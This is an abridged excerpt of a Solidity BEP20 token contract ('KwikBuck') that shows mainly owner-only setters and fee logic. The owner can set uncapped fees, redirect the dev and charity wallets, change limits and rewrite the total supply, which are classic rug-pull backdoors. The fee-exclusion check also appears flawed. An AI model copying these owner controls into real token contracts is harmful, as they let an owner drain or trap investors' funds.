...
contract Ownable is Context {
    ...
    constructor () internal {
        // _owner = address(0x8eDb6116Ab81FC57696993B109CBf1679BDeD410);
...
contract KwikBuck is Context, IBEP20, Ownable {
    ...
    uint256 public _maxTxAmount = 100000000*1e9;
    uint256 private _numTokensSellToAddToLiquidity = 100000*1e9;
    ...
    constructor () public {
        ...
        charitywallet=0xb496453eb7089eC8b6E1FF8B1052E216C80bf50d;
        devWallet=0xfdce9bB38d69c9d56b947BeDB4F7C6d3bA499836;


        emit Transfer(address(0), owner(), _tTotal);
    }
    function setdevWallet(address payable val) public onlyOwner{
        devWallet = val;
    }
    function setcharitywallet(address payable val) public onlyOwner{
        charitywallet = val;
    }
    function setnumTokensSellToAddToLiquidity(uint256 val) public onlyOwner{
        _numTokensSellToAddToLiquidity = val;
    }
    function setmaxTxAmount(uint256 val) public onlyOwner{
        _maxTxAmount = val;
    }
    function setrewardFee(uint256 val) public onlyOwner{
        _rewardFee = val;
    }
    function setcharityFee(uint256 val) public onlyOwner{
        _charityFee = val;
    }
    function setdevFee(uint256 val) public onlyOwner{
        _devFee = val;
    }
    ...
    function settTotal(uint256 val) public onlyOwner{
        _tTotal = val;
    }
    ...
    function _takeReward(uint256 tAmount)private {
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from] || !_isExcludedFromFee[to]){
             ...
             require(balanceOf(from) >= amount+fee,"insufficient balance");
        }
        ...
        if (
            ...
            uint256 reward=giveTransferReward(rewardTokens);
            //add liquidity
            swapreward(reward);
            rewardTokens=rewardTokens.sub(reward);
        }
    ...
    function giveTransferReward(uint256 amount)public pure returns(uint256){
        if(amount<100e9){
            ...
            return(amount.mul(18).div(1000));
        }
        else if(amount>=500e9 && amount < 1000e9){
            return(amount.mul(16).div(1000));
        }
        else if(amount>=1000e9 && amount < 10000e9){
            return(amount.mul(14).div(1000));
        }
        else if(amount>=10000e9 && amount < 100000e9){
            return(amount.mul(12).div(1000));
        }
        else{
